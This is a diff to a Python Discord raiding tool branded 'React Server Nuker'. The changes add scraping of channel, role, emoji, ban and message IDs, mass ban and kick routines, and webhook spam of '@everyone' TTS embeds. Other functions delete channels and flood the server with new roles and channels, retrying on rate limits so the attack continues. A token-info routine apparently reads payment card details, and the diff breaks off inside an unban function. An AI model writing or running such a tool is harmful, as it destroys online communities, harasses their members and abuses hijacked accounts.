@@ -1,39 +1,44 @@
-import requests
-import json
-import pathlib 
-import time
-import websocket
-import base64
-import random
-import os
-import socket
-import sys
-import pypresence
-import threading
-import hashlib
-import base64
-import string
-import datetime
-import subprocess
-import ctypes
+try:
+    import discum
+    import requests
+    import json
+    import pathlib 
+    import time
+    import websocket
+    import base64
+    import random
+    import os
+    import socket
+    import sys
+    import pypresence
+    import threading
+    import hashlib
+    import base64
+    import string
+    import datetime
+    import subprocess
+    import ctypes
+    import colorama
+    
+    from colorama import Fore , Style
+    from selenium import webdriver
+    from concurrent.futures import ThreadPoolExecutor
 
-from colorama import Fore , Style , init
-from selenium import webdriver
-from concurrent.futures import ThreadPoolExecutor
+except ImportError:
+    print("Import error ; pip install -r requirements.txt")
 
-init(autoreset=True)
+colorama.init(autoreset=True)
 lock = threading.Lock()
 
 class Colour:
 
     YELLOW = Fore.YELLOW
     CYAN = Fore.CYAN
-    WHITE = Fore.WHITE
+    WHITE = Fore.WHITE  
     RED = Fore.RED
     GREEN = Fore.GREEN
     MAGENTA = Fore.MAGENTA
     LIGHTBLUE = Fore.LIGHTBLUE_EX
-
     BRIGHT = Style.BRIGHT
 
 class URL:
@@ -52,10 +57,9 @@ class URL:
 
 class Constant:
     CheckForUpdate = False
-    RPC = True
+    RPC = False
     Space= " "*19
     Blank = "_"*37
-    Lang = "Eng" #[Eng / Thai] 
     if pathlib.Path("config.json").exists():
         START = True
         with open('config.json') as setting:
@@ -164,6 +168,18 @@ class Status:
         lock.release()
 
 class Function:
+
+    def SendHeartBeatInterval(Interval, Websocket):
+        while True:
+            time.sleep(Interval/1000)
+            try:
+                Websocket.send(json.dumps({
+                    "op":1,
+                    "d":None}))
+
+            except Exception:
+                break
+
     def ConvertImgToBase64(Image):
         with open(Image, "rb") as img_file:
             Base64img = base64.b64encode(img_file.read()).decode()
@@ -205,11 +221,7 @@ class Function:
             time.sleep(0.075)
 
     def Menu():
-        if Constant.Lang.upper() in "ENGLISH":
-            i = 1
-        
-        else:
-            i = 2
+        i = 1
         
         print(f"""{Colour.LIGHTBLUE}                
                                         ██▀███  ▓█████ ▄▄▄       ▄████▄  ▄▄▄█████▓    {Colour.WHITE}B{Colour.LIGHTBLUE}
@@ -221,42 +233,50 @@ class Function:
                                         ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░  ░  ▒       ░         {Colour.WHITE}C{Colour.LIGHTBLUE}
                                         V.{Infomation().__VERSION__}                                       {Colour.WHITE}T{Colour.LIGHTBLUE}""")
         print(f"{Colour.YELLOW}{Constant.Space}╔═════════════════════╦═════════════════════╦═════════════════════╦═════════════════════╗")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}1{Colour.CYAN}] {Main.FunctionDict[1][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[1][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}10{Colour.CYAN}]{Main.FunctionDict[10][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[10][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}19{Colour.CYAN}]{Main.FunctionDict[19][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[19][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}28{Colour.CYAN}]{Main.FunctionDict[28][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[28][i])))}║")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}2{Colour.CYAN}] {Main.FunctionDict[2][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[2][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}11{Colour.CYAN}]{Main.FunctionDict[11][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[11][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}20{Colour.CYAN}]{Main.FunctionDict[20][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[20][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}29{Colour.CYAN}]{Main.FunctionDict[29][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[29][i])))}║")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}3{Colour.CYAN}] {Main.FunctionDict[3][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[3][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}12{Colour.CYAN}]{Main.FunctionDict[12][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[12][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}21{Colour.CYAN}]{Main.FunctionDict[21][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[21][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}30{Colour.CYAN}]{Main.FunctionDict[30][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[30][i])))}║")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}4{Colour.CYAN}] {Main.FunctionDict[4][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[4][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}13{Colour.CYAN}]{Main.FunctionDict[13][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[13][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}22{Colour.CYAN}]{Main.FunctionDict[22][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[22][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}31{Colour.CYAN}]{Main.FunctionDict[31][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[31][i])))}║")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}5{Colour.CYAN}] {Main.FunctionDict[5][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[5][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}14{Colour.CYAN}]{Main.FunctionDict[14][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[14][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}23{Colour.CYAN}]{Main.FunctionDict[23][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[23][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}32{Colour.CYAN}]{Main.FunctionDict[32][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[32][i])))}║")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}6{Colour.CYAN}] {Main.FunctionDict[6][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[6][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}15{Colour.CYAN}]{Main.FunctionDict[15][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[15][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}24{Colour.CYAN}]{Main.FunctionDict[24][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[24][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}33{Colour.CYAN}]{Main.FunctionDict[33][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[33][i])))}║")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}7{Colour.CYAN}] {Main.FunctionDict[7][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[7][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}16{Colour.CYAN}]{Main.FunctionDict[16][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[16][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}25{Colour.CYAN}]{Main.FunctionDict[25][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[25][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}34{Colour.CYAN}]{Main.FunctionDict[34][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[34][i])))}║")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}8{Colour.CYAN}] {Main.FunctionDict[8][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[8][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}17{Colour.CYAN}]{Main.FunctionDict[17][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[17][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}26{Colour.CYAN}]{Main.FunctionDict[26][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[26][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}35{Colour.CYAN}]{Main.FunctionDict[35][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[35][i])))}║")
-        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}9{Colour.CYAN}] {Main.FunctionDict[9][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[9][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}18{Colour.CYAN}]{Main.FunctionDict[18][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[18][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}27{Colour.CYAN}]{Main.FunctionDict[27][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[27][i])))}"\
-                                             f"║{Colour.CYAN} [{Colour.WHITE}36{Colour.CYAN}]{Colour.RED}{Main.FunctionDict[36][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[36][i])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}1{Colour.CYAN}] {Main.FunctionDict[1][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[1][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}12{Colour.CYAN}]{Main.FunctionDict[12][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[12][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}23{Colour.CYAN}]{Main.FunctionDict[23][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[23][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}34{Colour.CYAN}]{Main.FunctionDict[34][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[34][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}2{Colour.CYAN}] {Main.FunctionDict[2][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[2][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}13{Colour.CYAN}]{Main.FunctionDict[13][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[13][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}24{Colour.CYAN}]{Main.FunctionDict[24][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[24][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}35{Colour.CYAN}]{Main.FunctionDict[35][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[35][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}3{Colour.CYAN}] {Main.FunctionDict[3][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[3][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}14{Colour.CYAN}]{Main.FunctionDict[14][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[14][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}25{Colour.CYAN}]{Main.FunctionDict[25][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[25][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}36{Colour.CYAN}]{Main.FunctionDict[36][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[36][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}4{Colour.CYAN}] {Main.FunctionDict[4][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[4][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}15{Colour.CYAN}]{Main.FunctionDict[15][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[15][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}26{Colour.CYAN}]{Main.FunctionDict[26][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[26][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}37{Colour.CYAN}]{Main.FunctionDict[37][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[37][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}5{Colour.CYAN}] {Main.FunctionDict[5][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[5][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}16{Colour.CYAN}]{Main.FunctionDict[16][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[16][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}27{Colour.CYAN}]{Main.FunctionDict[27][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[27][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}38{Colour.CYAN}]{Main.FunctionDict[38][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[38][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}6{Colour.CYAN}] {Main.FunctionDict[6][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[6][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}17{Colour.CYAN}]{Main.FunctionDict[17][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[17][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}28{Colour.CYAN}]{Main.FunctionDict[28][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[28][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}39{Colour.CYAN}]{Main.FunctionDict[39][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[39][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}7{Colour.CYAN}] {Main.FunctionDict[7][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[7][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}18{Colour.CYAN}]{Main.FunctionDict[18][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[18][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}29{Colour.CYAN}]{Main.FunctionDict[29][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[29][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}40{Colour.CYAN}]{Main.FunctionDict[40][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[40][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}8{Colour.CYAN}] {Main.FunctionDict[8][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[8][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}19{Colour.CYAN}]{Main.FunctionDict[19][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[19][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}30{Colour.CYAN}]{Main.FunctionDict[30][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[30][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}41{Colour.CYAN}]{Main.FunctionDict[41][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[41][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}9{Colour.CYAN}] {Main.FunctionDict[9][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[9][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}20{Colour.CYAN}]{Main.FunctionDict[20][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[20][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}31{Colour.CYAN}]{Main.FunctionDict[31][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[31][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}42{Colour.CYAN}]{Main.FunctionDict[42][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[42][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}10{Colour.CYAN}]{Main.FunctionDict[10][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[10][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}21{Colour.CYAN}]{Main.FunctionDict[21][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[21][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}32{Colour.CYAN}]{Main.FunctionDict[32][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[32][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}43{Colour.CYAN}]{Main.FunctionDict[43][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[43][1])))}║")
+        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}11{Colour.CYAN}]{Main.FunctionDict[11][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[11][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}22{Colour.CYAN}]{Main.FunctionDict[22][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[22][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}33{Colour.CYAN}]{Main.FunctionDict[33][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[33][1])))}"\
+                                             f"║{Colour.CYAN} [{Colour.WHITE}44{Colour.CYAN}]{Colour.RED}{Main.FunctionDict[44][1]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[44][1])))}║")
         print(f"{Colour.YELLOW}{Constant.Space}╚═════════════════════╩═════════════════════╩═════════════════════╩═════════════════════╝")
 
 class ReqHeader:
@@ -301,8 +321,9 @@ class ReqHeader:
 
 class Data:
     def GetUserInfoServer():
-        response = requests.get(f"{URL.BaseURL}/guilds/{Constant.SERVER_ID}/members/394447088970104833",headers=ReqHeader.DiscordHeader())
+        response = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members/394447088970104833",headers=ReqHeader.DiscordHeader())
         print(response.json())
+        
     def GetTokenInfo():
         if Constant.TOKEN is not False:
             CC_Digits = {
@@ -332,34 +353,147 @@ class Data:
         else:
             print("")
 
+    def GetBanMember_ID():
+        if Constant.TOKEN is not False:
+            ban_id = []
+            bans = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans", headers = ReqHeader.DiscordHeader())
+            if bans.status_code in Status.SuccessStatus:
+                for i , items in enumerate(bans.json()):
+                    ban_id.append(items["user"]["id"])
+                return ban_id
+            
+            elif bans.status_code in Status.Ratelimit:
+                Status.Ratelimit("Ratelimit")
+            
+            else:
+                Status.Fail("Unable to scrape Ban Members ID")
+
+            return []
+
     def GetChannel_ID():
         if Constant.TOKEN is not False:
             channel_id = [] 
-            channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader()).json()
-            for i , items in enumerate(channels):
-                channel_id.append(items["id"])
+            channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader())
+            if channels.status_code in Status.SuccessStatus:    
+                for i , items in enumerate(channels.json()):
+                    channel_id.append(items["id"])
 
-            return channel_id
+                Status.Success("Scraped Channels ID")
+                return channel_id
+            
+            elif channels.status_code in Status.RatelimitStatus:
+                Status.Ratelimit("Ratelimit")
+            
+            else:
+                Status.Fail("Unable to scrape Channels ID")
+            
+            return []
+
     
+    def GetTextChannel_ID():
+        if Constant.TOKEN is not False:
+            text_channel_id = [] 
+            response = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}",headers=ReqHeader.DiscordHeader()).json()
+            channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader())
+            if "COMMUNITY" in response["features"]:
+                Mod_channel = response["public_updates_channel_id"]
+
+            if channels.status_code in Status.SuccessStatus:    
+                for i , items in enumerate(channels.json()):
+                    if items["type"] == 0 and items["id"] != Mod_channel:
+                        text_channel_id.append(items["id"])
+
+                return text_channel_id
+
+            elif channels.status_code in Status.RatelimitStatus:
+                Status.Ratelimit("Ratelimit")
+            
+            else:
+                Status.Fail("Unable to scrape Text Channels ID")
+
+            return []
+
     def GetRole_ID():
         if Constant.TOKEN is not False:
             role_id = []
-            roles = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers= ReqHeader.DiscordHeader()).json()
-            for i , items in enumerate(roles):
-                role_id.append(items["id"])
+            roles = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers= ReqHeader.DiscordHeader())
+            if roles.status_code in Status.SuccessStatus:
+                for i , items in enumerate(roles.json()):
+                    role_id.append(items["id"])
+                
+                Status.Success("Scraped Role ID")
+                return role_id
+            
+            elif roles.status_code in Status.Ratelimit:
+                Status.Ratelimit("Ratelimit")
+            
+            else:
+                Status.Fail("Unable to scrape Roles ID")
+            
+            return []
+    
+    def GetEmoji_ID():
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
+            emoji_id = []
+            emojis = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/emojis", headers=ReqHeader.DiscordHeader())
+            if emojis.status_code in Status.SuccessStatus:
+                for i , items in enumerate(emojis.json()):
+                    emoji_id.append(items["id"])
+                
+                Status.Success("Scraped Emoji ID")
+                return emoji_id
 
-            return role_id
+            
+            elif emojis.status_code in Status.RatelimitStatus:
+                Status.Ratelimit("Ratelimit")
 
-    def GetMember_ID():
+            else:
+                Status.Fail("Unable to scrape Emoji ID") 
+
+            return []
+
+    def GetMessage_ID(Channel):
         if Constant.TOKEN is not False:
-            member_id = []
-            members = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members?limit=1000", headers= ReqHeader.DiscordHeader()).json()
-            for i , items in enumerate(members):
-                member_id.append(items["user"]["id"])
+            message_id = []
+            messages = requests.get(f"{URL.BaseURL}channels/{Channel}/messages?limit=50")
+            if messages.status_code in Status.SuccessStatus:
+                for i , items in enumerate(messages.json()):
+                    message_id.append(items["id"])  
 
-            return member_id
+                Status.Success("Scraped Message ID")
+                return message_id
+
+            elif messages.status_code in Status.RatelimitStatus:
+                Status.Ratelimit("Ratelimit")
+            
+            else:
+                Status.Fail("Unable to scrape Message ID")
+
+            return []
 
 class Discord:
+
+    def PinMessage(Channel , Message):
+        response = requests.put(f"{URL.BaseURL}channels/{Channel}/pins/{Message}", headers=ReqHeader.DiscordHeader())
+        if response.status_code in Status.SuccessStatus:
+            Status.Success(f"{Message} in {Channel} Pinned")
+        
+        elif response.status_code in Status.RatelimitStatus:
+            Status.Ratelimit("Ratelimit")
+        
+        else:
+            Status.Fail(f"Unable to pin {Message} in {Channel}")
+
+    def CreateDiscordBot():
+        response = requests.post(f"{URL.BaseURL}applications", json={"name":"React","team_id":None}, headers=ReqHeader.DiscordHeader())
+        if response.status_code in Status.SuccessStatus:
+            Status.Success(f"Created application {response.json()['id']}")
+            bot = requests.post(f"{URL.BaseURL}applications/{response.json()['id']}/bot")
+
+        else:
+            Status.Fail(f"Failed to create application")
+
+
     def DiscordTokenLogin():
         response= requests.get(f"{URL.Canary}users/@me", headers=ReqHeader.DiscordHeader())
         if response.status_code in Status.SuccessStatus:
@@ -397,7 +531,7 @@ class Discord:
                 "description":"",
                 "name":"React"
             }).json() 
-            guild = requests.get(f"{URL.BaseURL}/guilds/{Constant.SERVER_ID}", headers=ReqHeader.DiscordHeader()).json()
+            guild = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}", headers=ReqHeader.DiscordHeader()).json()
             guild_icon = base64.b64encode(requests.get(f'{URL.CdnURL}icons/{guild["id"]}/{guild["icon"]}.webp?size=1024').content).decode()    
             bs64_guild_icon = (f"data:image/jpeg;base64,{guild_icon}")
             create = requests.post(f"{URL.BaseURL}guilds/templates/{response['code']}",headers=ReqHeader.DiscordHeader(),json={
@@ -468,7 +602,7 @@ class Discord:
         if Dynamic.upper() in ["Y","YES"]:
             Stat = [""]
             for i , items in enumerate(Text):
-                Stat.append(items + Text[i])
+                Stat.append(Stat[i]+items)
             del Stat[0]
 
             while True:
@@ -510,7 +644,8 @@ class Discord:
                     "avatar_url": URL.IconURL,
                     "content": "@everyone",
                     "tts": True,
-                    "embeds": [{
+                    "embeds": [
+                        {
                         "title": "React Server Nuker",
                         "description": f"@everyone\n\n> {Message}",
                         "color": random.randint(0, 16777215),
@@ -531,7 +666,29 @@ class Discord:
                                 "url": URL.IconURL
                             }
                         },
-                        {"title": "React Server Nuker",
+                        {
+                        "title": "React Server Nuker",
+                        "description": f"@everyone\n\n> {Message}",
+                        "color": random.randint(0, 16777215),
+                        "author": {
+                                "name": "React Server Nuker",
+                                "url": "https://smilewindiscord-th.web.app/joindiscord.html",
+                                "icon_url": URL.IconURL
+                            },
+                            "footer": {
+                                "text": "Nuked ~",
+                                "icon_url": URL.IconURL
+                            },
+                            "timestamp": f"{str(datetime.datetime.utcnow())}",
+                            "image": {
+                                "url": URL.IconURL
+                            },
+                            "thumbnail": {
+                                "url": URL.IconURL
+                            }
+                        },
+                        {
+                        "title": "React Server Nuker",
                         "description": f"@everyone\n\n> {Message}",
                         "color": random.randint(0, 16777215),
                         "author": {
@@ -551,6 +708,7 @@ class Discord:
                                 "url": URL.IconURL
                             }
                         }
+            
                     ]
                 }
             )
@@ -576,13 +734,11 @@ class Discord:
             Status.Success(f"Created Role {RoleName}")
 
         elif response.status_code in Status.RatelimitStatus:
-            print(response.json())
             Status.Ratelimit(f"Ratelimit")
             time.sleep(0.05)
             threading.Thread(target=Discord.CreateRole, args=(str(RoleName))).start()
         
         else:
-            print(response.json() + response.status_code)
             Status.Fail(f"Couldn't Create Role {RoleName}")
 
     def DeleteRole(RoleID):
@@ -627,7 +783,6 @@ class Discord:
             threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()
 
         else:
-            print(response.json())
             Status.Fail(f"Couldn't Create Channel {ChannelName}")
 
 
@@ -640,10 +795,10 @@ class Discord:
             elif response.status_code in Status.RatelimitStatus:
                 Status.Ratelimit(f"Ratelimit")
                 time.sleep(0.05)
-                threading.Thread(target=Discord.DeleteChannel, args=(ChannelID)).start()
+                with ThreadPoolExecutor(max_workers=1) as executor:
+                    executor.submit(Discord.DeleteChannel,ChannelID)
 
             else:
-                print(response.json())
                 Status.Fail(f"Couldn't Delete Channel {ChannelID}")
         except:
             pass
@@ -662,7 +817,6 @@ class Discord:
             threading.Thread(target=Discord.ChangeChannelName,args=(Channel, ChannelName)).start()
 
         else:
-            print(response.json())
             Status.Fail(f"CHANNEL NAME NOT CHANGED")
 
     def CreateCategory(ChannelName):
@@ -701,7 +855,10 @@ class Discord:
         else:
             Status.Fail(f"Couldn't Create Channel {ChannelName}")
 
-    def Ban(Member):
+    def Ban(Member= None):
+        if Member is None:
+            Member = input(f"{Constant.Space}{Colour.YELLOW}Member ID : ")
+
         try:
             response = requests.put(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                 'delete_message_days': '7',
@@ -713,7 +870,7 @@ class Discord:
             elif response.status_code in Status.RatelimitStatus:
                 Status.Ratelimit(f"Ratelimit")
                 time.sleep(0.05)
-                threading.Thread(target=Discord.Ban, args=(Member)).start()
+                threading.Thread(target=Discord.Ban, args=(str(Member))).start()
                 
             else:
                 Status.Fail(f"Failed to ban {Member}")
@@ -721,11 +878,14 @@ class Discord:
         except:
             pass
 
-    def Kick(Member):
+    def Kick(Member = None):
+        if Member is None:
+            Member = input(f"{Constant.Space}{Colour.YELLOW}Member ID : ")
+
         try:
             response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members/{Member}", headers=ReqHeader.DiscordHeader(), json = {
-                'delete_message_days': '7',
-                'reason': 'NUKE'
+                "delete_message_days": "7",
+                "reason": "React"
             })
             if response.status_code in Status.SuccessStatus:
                 Status.Success(f"{Member}")
@@ -733,11 +893,30 @@ class Discord:
             elif response.status_code in Status.RatelimitStatus:
                 Status.Ratelimit(f"Ratelimit")
                 time.sleep(0.05)
-                threading.Thread(target=Discord.Kick, args=(Member)).start()
+                threading.Thread(target=Discord.Kick, args=(str(Member))).start()
             
             else:
                 Status.Fail(f"{Member}")
                 
+        except:
+            pass
+    
+    def Unban(Member = None):
+        if Member is None:
+            Member = input(f"{Constant.Space}{Colour.YELLOW}Member ID : ")
+        try:
+            response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans/{Member}",headers=ReqHeader.DiscordHeader())
